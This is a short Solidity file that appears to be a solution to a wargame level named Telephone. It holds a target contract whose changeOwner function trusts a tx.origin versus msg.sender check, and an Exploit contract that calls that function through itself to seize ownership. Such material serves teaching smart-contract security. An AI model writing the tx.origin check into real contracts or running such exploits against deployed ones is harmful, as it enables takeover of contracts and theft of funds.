// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Exploit is Destructible, Targeted {
    constructor(address target_addr) payable Targeted(target_addr) {
    }
    function exploit() public payable {
        Telephone telephone = Telephone(Targeted(this).target());
        telephone.changeOwner(Destructible(this).owner());
    }
}